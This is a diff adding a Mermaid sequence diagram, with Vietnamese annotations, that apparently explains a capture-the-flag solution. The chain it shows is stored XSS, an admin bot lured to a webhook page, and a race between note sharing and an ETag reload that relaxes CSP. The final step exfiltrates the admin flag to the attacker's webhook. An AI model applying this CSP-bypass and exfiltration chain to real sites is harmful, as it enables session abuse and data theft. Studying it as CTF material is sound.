@@ -1,0 +1,56 @@
+sequenceDiagram
+    autonumber
+    participant A as Attacker (Python)
+    participant W as Webhook (Payload HTML)
+    participant S as Server (localhost:3000)
+    participant B as Admin Bot (Chrome)
+
+    rect rgb(240, 248, 255)
+        note right of A: GIAI ĐOẠN 1: CHUẨN BỊ (PREPARATION)
+        A->>S: POST /login (username: attacker)
+        S-->>A: 302 Redirect (Set-Cookie session)
+        A->>S: POST /api/note (Nội dung chứa XSS)
+        S-->>A: Trả về note_id 
+    end
+
+    rect rgb(255, 235, 238)
+        note right of A: GIAI ĐOẠN 2: KÍCH HOẠT (TRIGGER)
+        A->>S: POST /report (url=http://webhook...)
+        S->>B: Khởi động Puppeteer & Đăng nhập Admin
+        B->>W: GET /payload.html
+        W-->>B: Trả về Script (window.open & setTimeout 5s)
+    end
+
+    rect rgb(255, 248, 225)
+        note right of A: GIAI ĐOẠN 3: ĐIỀU KIỆN TƯƠNG TRANH (RACE CONDITION)
+        
+        %% Bước 1 của Race: Bot mở note lần đầu
+        B->>S: GET /note/:note_id (First Load - Không có If-None-Match)
+        note over S: isConditional = false<br/>Cập nhật lastFreshView = T1
+        S-->>B: 200 OK (Kèm theo ETag của Note)
+
+        %% Bước 2 của Race: Attacker Share note (Python xen vào giữa)
+        A->>S: POST /api/note/:note_id/share (allow_redirects=False)
+        note over S: Cập nhật shareTime = T2<br/>(Đảm bảo T2 > T1)
+        S-->>A: 302 Redirect (Python chặn follow)
+    end
+
+    rect rgb(232, 245, 233)
+        note right of A: GIAI ĐOẠN 4: THỰC THI & CƯỚP CỜ (EXFILTRATION)
+        note right of B: Chờ hết 5 giây (setTimeout hoàn thành)
+        
+        %% Bước 3: Bot reload trang
+        B->>S: GET /note/:note_id (Reload - Có gửi If-None-Match: ETag)
+        note over S: isConditional = true<br/>shareTime (T2) > lastFreshView (T1)
+        note over S: Điều kiện Bypass CSP Thỏa mãn!
+        S-->>B: 200 OK (CSP: unsafe-inline)
+
+        %% XSS Kích hoạt
+        note over B: Payload XSS bắt đầu thực thi!
+        B->>S: GET /api/admin/data (Kèm Cookie Admin)
+        S-->>B: 200 OK ({"flag": "BKISC{...}"})
+        
+        %% Tuồn cờ ra ngoài
+        B->>W: GET /?flag={"flag":"BKISC{...}"}
+        note right of W: Bắt được cờ thành công!
+    end
